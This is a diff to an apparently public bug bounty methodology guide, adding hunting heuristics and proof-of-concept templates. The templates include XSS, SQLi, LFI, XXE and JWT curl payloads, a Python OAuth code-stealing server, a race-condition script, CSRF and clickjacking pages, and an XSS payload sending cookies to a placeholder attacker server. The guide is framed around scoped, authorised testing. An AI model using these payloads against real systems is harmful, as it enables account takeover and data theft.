@@ -49,8 +49,8 @@ No fluff. No filler. Just the workflow that finds bugs.
 | 4.16 | ↳ [Business Logic](#416-business-logic-flaws) | Coupon · Price · Quantity · Payment · Trial |
 | 4.17 | ↳ [Open Redirect](#417-open-redirect) | 12 Bypass Techniques · OAuth Chaining |
 | 4.18 | ↳ [Information Disclosure](#418-information-disclosure--secret-leaks) | JS Secrets · .git · .env · Source Maps |
-| 5 | [Two-Eye Approach](#5-the-two-eye-approach) | Hunting Methodology |
-| 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Documentation & Evidence |
+| 5 | [Hunting Mindset](#5-hunting-mindset--methodology) | Strategy · Prioritization · Pivoting |
+| 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Screenshots · Scripts · Automation · Evidence |
 | 7 | [Reporting](#7-reporting) | Professional Write-ups |
 
 ---
@@ -1638,13 +1638,235 @@ cat js_files.txt | grep -oE "192\.168\.[0-9]{1,3}\.[0-9]{1,3}" | anew internal_i
 <br>
 
 
-## **5. The "Two-Eye" Approach 👀**
-1. **First Eye:** Focus on testing every gathered subdomain, endpoint, or parameter for common vulnerabilities.
-2. **Second Eye:** Identify “interesting” findings like exposed credentials, forgotten subdomains, or admin panels.
+## **5. Hunting Mindset & Methodology**
 
-### **Actionable Steps:**
-- If a vulnerability is identified, create a proof of concept (POC) and test its impact.
-- If no vulnerabilities are found, pivot to deeper testing on unique subdomains or endpoints.
+> *"Scanners find noise. Hunters find impact."*
+
+---
+
+### **5.1 The Two-Eye Approach — Deepened**
+
+Every target gets two passes. Don't mix them.
+
+| | **First Eye: Surface Sweep** | **Second Eye: Deep Hunt** |
+|---|---|---|
+| **Goal** | Find every parameter, endpoint, and function | Break the application logic |
+| **Speed** | Fast — minutes per subdomain | Slow — hours per feature |
+| **Tools** | Automated scanners, regex sweeps | Burp Repeater, manual tampering |
+| **Output** | Candidate list of testable inputs | Validated findings with impact |
+| **Mindset** | "What's here?" | "What breaks when I twist this?" |
+
+**First Eye — The Surface Sweep**
+```bash
+# For each live subdomain, run in parallel:
+echo "https://target.com" | katana -jc -o urls.txt &          # all URLs
+echo "https://target.com" | hakrawler -js -depth 2 &           # JS links
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/content_discovery.txt -mc 200,403,301,302 &  # dirs/files
+echo "https://target.com" | waybackurls | grep "=" &           # parameters
+
+# From all output: feed every URL with a parameter into the Section 4 matrix
+cat urls.txt | grep "=" | sort -u | anew all_testable_params.txt
+```
+
+**Second Eye — The Deep Hunt**
+```bash
+# Pick ONE high-value feature at a time. Don't jump around.
+# Example: account registration flow
+# → Test every field: name, email, password, phone, referral_code
+# → Register with every role-adjacent value: admin, moderator, staff, owner
+# → Duplicate registration: same email, same phone, same username
+# → Race: register →reset password → verify email simultaneously
+# → IDOR: after registration, enumerate user IDs in profile endpoints
+# → Spoof referrals: ?ref=admin, ?ref=1, ?ref=null
+# → Check email templates for SSTI: inject {{7*7}} in name field, see if reflected in email
+
+# ONE flow fully explored > 100 endpoints lightly touched
+```
+
+---
+
+### **5.2 The 80/20 Rule of Bug Bounty**
+
+```
+80% of critical bugs come from 20% of the attack surface.
+That 20% is usually:
+
+├── Authentication flows (login, register, password reset, OAuth, MFA)
+├── User-role transitions (upgrade, downgrade, invite, team join)
+├── Payment/cart/checkout flows
+├── File upload/import/export endpoints
+├── API endpoints with user-controlled IDs in URLs
+├── Admin panels (even low-privilege ones)
+├── Webhooks, callbacks, redirect_uri parameters
+└── Any endpoint accepting XML, YAML, or serialized data
+
+Test these FIRST. The forms, the search bar, and the contact page
+can wait.
+```
+
+---
+
+### **5.3 Hunting Heuristics — Patterns That Pay**
+
+**The "Too Convenient" Heuristic**
+> If a parameter name perfectly describes what it controls, it's probably exploitable.
+> `?isAdmin=false` → `?isAdmin=true`   |   `?role=user` → `?role=admin`
+> `?debug=0` → `?debug=1`   |   `?internal=false` → `?internal=true`
+
+**The "Forgotten Sibling" Heuristic**
+```bash
+# Subdomains often have forgotten dev/staging copies with weaker security
+# dev.target.com, staging.target.com, test.target.com, uat.target.com
+# If you find one, test it FIRST — often has debug modes, verbose errors,
+# and weaker access controls than production
+```
+
+**The "API Leak" Heuristic**
+```bash
+# If the site uses React/Vue/Angular and you find JS that references
+# /api/internal/users, /api/admin/stats — these endpoints are used by the
+# frontend. Test them with your user's session cookie immediately.
+cat js_files.txt | grep -E "/api/(internal|admin|staff|private|partner)" | sort -u
+```
+
+**The "Copy-Paste" Heuristic**
+> Developers copy code between endpoints. If `GET /api/user/1/profile` has
+> an IDOR, `GET /api/user/1/orders`, `/api/user/1/settings`, and
+> `/api/user/1/payments` probably do too. Test siblings exhaustively.
+
+**The "Error Message" Heuristic**
+> Verbose errors are reconnaissance gold:
+> - SQL error → SQLi candidate, identifies DB engine
+> - Stack trace → reveals framework, version, file paths
+> - "User not found" vs "Invalid password" → username enumeration
+> - "Permission denied" vs "Not found" → IDOR confirmation (403 vs 404)
+
+---
+
+### **5.4 Prioritization Matrix — What To Test When**
+
+```
+┌─────────────────────────────────────────────────┐
+│ HIGH PRIORITY (First hour of testing)            │
+├─────────────────────────────────────────────────┤
+│ □ Auth: register → login → password reset → MFA │
+│ □ IDOR: change user ID in every API call         │
+│ □ Role: add ?role=admin / {"isAdmin":true}       │
+│ □ SSRF: any url=/path=/redirect=/callback= param │
+│ □ File upload: try shell.php.jpg on avatar field │
+│ □ Secrets: grep JS files for API keys            │
+├─────────────────────────────────────────────────┤
+│ MEDIUM PRIORITY (If nothing critical found)      │
+├─────────────────────────────────────────────────┤
+│ □ XSS: every reflected input, every stored field │
+│ □ CSRF: every state-changing request             │
+│ □ Open Redirect: every redirect=/next=/return=   │
+│ □ SQLi: every numeric/string parameter           │
+│ □ SSTI: any field that renders in templates      │
+│ □ XXE: any XML endpoint or file upload           │
+│ □ Business logic: payment, coupon, checkout      │
+├─────────────────────────────────────────────────┤
+│ DEEP DIVE (Only on high-value targets)           │
+├─────────────────────────────────────────────────┤
+│ □ HTTP Smuggling (requires CDN detection first)  │
+│ □ Cache Poisoning (requires caching confirmation)│
+│ □ Race conditions (Turbo Intruder last-byte sync)│
+│ □ Deserialization (requires format confirmation) │
+│ □ Prototype pollution (Node.js/Express targets)  │
+└─────────────────────────────────────────────────┘
+```
+
+---
+
+### **5.5 When To Pivot vs When To Go Deep**
+
+| **Signal** | **Action** |
+|---|---|
+| 5 minutes, no parameters found | **PIVOT.** This page has no attack surface. |
+| Found 1 IDOR, no other impact | **GO DEEP.** Test all sibling endpoints (see heuristic above). |
+| 30 minutes, nothing exploitable | **PIVOT.** The subdomain is well-hardened. |
+| 404 on every forced browse | **PIVOT.** No exposed admin panels here. |
+| Error message reveals stack trace | **GO DEEP.** Verbose errors = weak security posture. |
+| JS file has 50+ unique API routes | **GO DEEP.** Massive undocumented attack surface. |
+| Same tech stack as main app on subdomain | **PIVOT.** Test the subdomain — same vulns may exist. |
+| WAF blocking all payloads after 3 attempts | **PIVOT.** Come back with bypasses, don't burn your IP. |
+
+---
+
+### **5.6 Session Hygiene — Don't Burn Yourself**
+
+```bash
+# 1. NEVER test auth bypass / IDOR with your main session
+#    → Use incognito / fresh browser for validation
+
+# 2. NEVER test destructive actions on production without explicit scope
+#    → Read the program policy. "No deletion of user data" means it.
+#    → Use canary/test accounts. Create your own.
+
+# 3. If you trigger a server error, that endpoint is fragile
+#    → Note it, move on, come back with surgical precision later
+
+# 4. Rate limits are real. Space out your fuzzing.
+#    → Use --delay or -t 1 on ffuf/sqlmap against production
+
+# 5. Burp Collaborator / interactsh is your best friend for blind vulns
+#    → If you can't see it, make the server call YOU
+```
+
+---
+
+### **5.7 The Daily Hunting Rhythm**
+
+```
+SESSION START (15 min)
+├── Check for new subdomains (subfinder -d target.com -silent -all)
+├── Check for new JS files on known hosts
+├── Verify yesterday's collaborator interactions
+└── Pick ONE feature to hunt today
+
+HUNTING BLOCK (2 hours)
+├── Deep dive on chosen feature
+├── Take notes: what params exist, what errors you got
+├── Save ALL interesting requests to Burp Organizer
+└── If you find a vuln → reproduce it, screenshot it, write PoC immediately
+
+SESSION END (15 min)
+├── Document findings (even failed ones — you learned something)
+├── Archive interesting requests for tomorrow
+├── Note any new endpoints discovered for future hunts
+└── Push notes to your private repo
+```
+
+---
+
+### **5.8 Avoiding Common Traps**
+
+```
+TRAP 1: "Let me just run this scanner on everything..."
+REALITY: You'll spend 3 hours waiting for results you could have
+         manually tested in 20 minutes. Scan surgically.
+
+TRAP 2: "This looks like it might be exploitable, I'll come back to it."
+REALITY: You won't. Either test it NOW or document it well enough
+         that you can resume instantly.
+
+TRAP 3: "I found a low-severity XSS, time to write a report."
+REALITY: Chain it first. XSS → session theft → ATO = Critical.
+         Open Redirect → OAuth theft = Critical.
+         Always ask: "What can I chain this with?"
+
+TRAP 4: "The WAF blocked my payload. This target is secure."
+REALITY: WAFs have bypasses. See Section 4 for each vuln class.
+         Try encoding, obfuscation, alternative syntax.
+         If the WAF blocks <script>, try <img onerror=>.
+
+TRAP 5: "I need to test EVERY subdomain equally."
+REALITY: You don't. Spend 80% of time on the 20% that has:
+         - Login/auth flows
+         - User content (profiles, messages, uploads)
+         - Payment processing
+         - APIs with user IDs
+```
 
 
 
@@ -1655,15 +1877,366 @@ cat js_files.txt | grep -oE "192\.168\.[0-9]{1,3}\.[0-9]{1,3}" | anew internal_i
 
 ## **6. Proof of Concept (POC) Creation**
 
-### **🎥Video POC**
+> *"A finding without a PoC is a story. A finding with a PoC is a fact."*
 
-Demonstrate vulnerabilities in action using screen recording tools like Greenshot or OBS Studio.
+---
 
-### **📸Screenshot POC**
+### **6.1 Screenshot Discipline — Evidence Hygiene**
 
-Capture clear screenshots with annotations to explain each step.
+**Tools:** Greenshot, Flameshot, ShareX, macOS Screenshot.app, Burp Suite
 
-- **🛠️Tool:** Greenshot.
+**Critical rules before ANY screenshot:**
+```bash
+# 1. REDACT session cookies/tokens from URL bar and request panels
+# 2. HIDE other users' PII (names, emails, phones, faces, addresses)
+# 3. HIDE your own IP, collaborator URLs if re-used
+# 4. USE test/throwaway accounts — never show real user data
+# 5. CAPTURE the full flow: request → response → result → impact
+```
+
+**Screenshot sequence for a finding:**
+```
+1. [BEFORE]   — Normal page, no payload
+2. [REQUEST]  — Burp Repeater showing the malicious request (hide cookie header)
+3. [RESPONSE] — Server response showing success (status code, body)
+4. [IMPACT]   — Browser showing the actual impact (popup, data leak, access gained)
+5. [REPRO]    — One clear shot showing step-by-step reproduction
+```
+
+---
+
+### **6.2 Video POC — OBS Studio Setup**
+
+```bash
+# Install OBS
+sudo apt install obs-studio   # Linux
+brew install obs               # macOS
+
+# OBS scene setup:
+# Scene 1: Full desktop (for multi-tool demos)
+# Scene 2: Burp Suite window only
+# Scene 3: Terminal + Browser side-by-side
+
+# Recording settings for bug bounty:
+# Resolution: 1920x1080
+# FPS: 15 (smaller file, good enough)
+# Format: MP4
+# Mic: OFF (no commentary needed for technical PoCs)
+
+# Before recording:
+# ✓ Close unnecessary tabs and apps
+# ✓ Clear browser history (no embarrassing URLs)
+# ✓ Set browser zoom to 100%
+# ✓ Have notepad open with steps to follow
+# ✓ Start recording BEFORE opening Burp (captures entire flow)
+```
+
+---
+
+### **6.3 cURL Reproduction Scripts**
+
+**One-liner PoC — Simple & Reproducible**
+```bash
+# XSS — reflected
+curl -s "https://target.com/search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E" | grep -o "alert(document.domain)"
+
+# SQLi — error-based
+curl -s "https://target.com/product?id=1'" | grep -i "sql\|mysql\|syntax\|error"
+
+# IDOR — access another user's data
+# As User A (attacker):
+curl -s -H "Cookie: session=USER_A_TOKEN" "https://target.com/api/user/2/profile" | jq .
+
+# SSRF — OOB confirmation
+curl -s "https://target.com/fetch?url=http://YOUR-COLLABORATOR.oastify.com"
+
+# LFI — passwd read
+curl -s "https://target.com/view?file=../../../../etc/passwd" | grep "root:x:"
+
+# Open redirect
+curl -sI "https://target.com/logout?redirect=//evil.com" | grep -i "location.*evil.com"
+
+# SSTI — math eval
+curl -s "https://target.com/preview?name={{7*7}}" | grep "49"
+
+# JWT alg=none
+curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0." https://target.com/api/admin/stats
+
+# XXE — basic file read
+curl -s -X POST -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>' \
+  https://target.com/api/import
+```
+
+---
+
+### **6.4 Python PoC Scripts**
+
+**Template 1 — Simple Request Proof**
+```python
+#!/usr/bin/env python3
+"""
+PoC: [Vulnerability Title]
+Target: https://target.com
+Severity: [Critical/High/Medium/Low]
+Author: [Your Handle]
+Date: [YYYY-MM-DD]
+"""
+
+import requests
+import sys
+
+TARGET = "https://target.com"
+SESSION = "your_session_cookie_here"
+
+def exploit():
+    # Step 1: Send malicious request
+    headers = {"Cookie": f"session={SESSION}"}
+    params = {"id": "1' OR '1'='1"}
+    
+    response = requests.get(f"{TARGET}/api/users", params=params, headers=headers)
+    
+    # Step 2: Verify exploitation
+    if "admin" in response.text.lower():
+        print("[+] VULNERABLE — Authentication bypass confirmed")
+        print(f"[+] Response contained {len(response.json())} user records")
+        return True
+    else:
+        print("[-] Target not vulnerable")
+        return False
+
+if __name__ == "__main__":
+    if exploit():
+        sys.exit(0)
+    else:
+        sys.exit(1)
+```
+
+**Template 2 — Multi-Step Attack (OAuth Token Theft)**
+```python
+#!/usr/bin/env python3
+"""
+PoC: OAuth Token Theft via Open Redirect
+Chain: Open Redirect → OAuth redirect_uri poisoning → Account Takeover
+
+1. Victim clicks malicious link → redirected to legitimate OAuth
+2. OAuth redirects back to legitimate open redirect
+3. Open redirect sends victim to attacker's server with auth code
+4. Attacker exchanges code for access token
+"""
+
+import http.server
+import socketserver
+import urllib.parse
+import sys
+
+ATTACKER_PORT = 8080
+OAUTH_URL = "https://target.com/oauth/authorize"
+CLIENT_ID = "target_app_client_id"
+OPEN_REDIRECT = "https://target.com/logout?redirect=https://YOUR_SERVER.com:8080/steal"
+
+class TokenStealer(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        parsed = urllib.parse.urlparse(self.path)
+        params = urllib.parse.parse_qs(parsed.query)
+        
+        if 'code' in params:
+            auth_code = params['code'][0]
+            print(f"\n[!] STOLEN OAUTH CODE: {auth_code}")
+            print(f"[!] Exchange at: POST /oauth/token with code={auth_code}")
+            
+            # Log to file
+            with open("stolen_codes.txt", "a") as f:
+                f.write(f"{auth_code}\n")
+        
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        self.wfile.write(b"<h1>Thanks for visiting!</h1>")
+
+if __name__ == "__main__":
+    print(f"[*] Starting token stealer on port {ATTACKER_PORT}")
+    print(f"[*] Send victim: {OAUTH_URL}?client_id={CLIENT_ID}&redirect_uri={OPEN_REDIRECT}")
+    print(f"[*] Waiting for victim to click...\n")
+    
+    with socketserver.TCPServer(("", ATTACKER_PORT), TokenStealer) as httpd:
+        try:
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            print("\n[!] Shutting down. Check stolen_codes.txt")
+```
+
+**Template 3 — Race Condition (Single-Packet)**
+```python
+#!/usr/bin/env python3
+"""
+PoC: Coupon Double-Redemption Race Condition
+Uses HTTP/2 concurrent streams to apply coupon twice in single TCP packet
+"""
+
+import asyncio
+import httpx
+
+TARGET = "https://target.com"
+COOKIE = "session=..."
+COUPON = "SAVE50"
+
+async def apply_coupon(client, request_id):
+    response = await client.post(
+        f"{TARGET}/cart/apply-coupon",
+        headers={"Cookie": COOKIE},
+        json={"code": COUPON}
+    )
+    print(f"[{request_id}] Status: {response.status_code}")
+    return response
+
+async def main():
+    async with httpx.AsyncClient(http2=True) as client:
+        # Fire 10 concurrent requests in single packet
+        tasks = [apply_coupon(client, i) for i in range(10)]
+        await asyncio.gather(*tasks)
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
+---
+
+### **6.5 HTML PoC Templates**
+
+**CSRF PoC**
+```html
+<!-- csrf_poc.html -->
+<html>
+<body>
+  <h2>CSRF — Email Change</h2>
+  <p>Visiting this page will automatically change the victim's email.</p>
+  <form action="https://target.com/api/settings/email" method="POST" id="csrf">
+    <input type="hidden" name="email" value="attacker@evil.com">
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
+```
+
+**XSS PoC (Cookie Theft)**
+```html
+<!-- xss_poc.html — demonstrates real impact -->
+<script>
+// Trigger reflected XSS to steal cookies
+const payload = "<img src=x onerror=\"fetch('https://YOUR_SERVER.com/steal?c='+document.cookie)\">";
+// If stored, just visit the page. If reflected, construct URL:
+window.location = `https://target.com/search?q=${encodeURIComponent(payload)}`;
+</script>
+```
+
+**Clickjacking PoC**
+```html
+<!-- clickjacking_poc.html -->
+<html>
+<body style="margin:0">
+  <h2>Clickjacking — Delete Account</h2>
+  <p>The delete button below is actually from target.com, made transparent.</p>
+  <div style="position:relative; width:300px; height:100px; overflow:hidden;">
+    <iframe src="https://target.com/settings/delete" 
+            style="position:absolute; top:-200px; left:-50px; 
+                   width:800px; height:600px; opacity:0.3;">
+    </iframe>
+  </div>
+</body>
+</html>
+```
+
+---
+
+### **6.6 Burp Suite Evidence Export**
+
+```bash
+# For each finding, export from Burp:
+
+# 1. HTTP Request/Response
+#    Repeater → right-click → "Copy to file" or "Save item"
+#    Save as: finding-name_request.txt and finding-name_response.txt
+
+# 2. Full Proxy History for the finding
+#    Filter proxy history to show only relevant requests
+#    Select all → right-click → "Save items"
+
+# 3. Site map snapshot
+#    Target → Site map → right-click target → "Copy URLs in this host"
+
+# 4. Burp State File (for catastrophic findings)
+#    Project options → "Save state file" → include proxy history + site map
+#    This preserves EVERYTHING for later review
+```
+
+---
+
+### **6.7 Quick PoC Automation — One-Liners**
+
+```bash
+# Auto-screenshot a URL with a payload
+echo "https://target.com/search?q=<script>alert(1)</script>" | aquatone -out poc_screenshots/
+
+# Auto-record terminal session (Linux)
+script poc_recording.txt --timing=poc_timing.txt
+# ... run your exploit commands ...
+exit
+# Replay: scriptreplay poc_timing.txt poc_recording.txt
+
+# Auto-capture HTTP exchange with headers
+curl -sv "https://target.com/vuln?id=1' OR '1'='1" 2>&1 | tee poc_http_trace.txt
+
+# Generate a timestamped evidence directory
+POC_DIR="poc_$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$POC_DIR"
+# Save everything there
+
+# Capture full page screenshot via headless Chrome
+chromium --headless --screenshot=poc_screenshot.png --window-size=1920,1080 \
+  "https://target.com/search?q=<script>alert(1)</script>"
+```
+
+---
+
+### **6.8 The PoC Repository Pattern**
+
+```bash
+# Organize evidence by target and finding
+mkdir -p evidence/{target_name}/{finding_name}/
+# evidence/
+# └── target.com/
+#     ├── idor_user_profile/
+#     │   ├── 01_normal_request.png
+#     │   ├── 02_idor_request.png
+#     │   ├── 03_response_with_other_user.png
+#     │   ├── poc_request.txt
+#     │   └── poc_script.py
+#     ├── sql_injection/
+#     │   ├── sqlmap_output.log
+#     │   ├── manual_poc.png
+#     │   └── extracted_database.txt
+#     └── xss_reflected/
+#         ├── alert_screenshot.png
+#         ├── cookie_theft_poc.html
+#         └── curl_poc.sh
+```
+
+---
+
+### **6.9 Before Submitting — The 7-Question Gate**
+
+Ask yourself before writing the report:
+
+| # | Question | If NO... |
+|---|---|---|
+| 1 | Can I reproduce it consistently? | Don't submit |
+| 2 | Is it in scope? (Check program policy) | Don't submit |
+| 3 | Is the impact clear and demonstrable? | Improve PoC first |
+| 4 | Is it NOT a duplicate of a known report? | Search disclosed reports |
+| 5 | Is it a real security issue, not a feature? | Re-evaluate |
+| 6 | Did I test on a TEST account, not real users? | Redact and re-test |
+| 7 | Is my evidence clean (no session cookies visible)? | Re-screenshot with redaction |
 
 
 ---
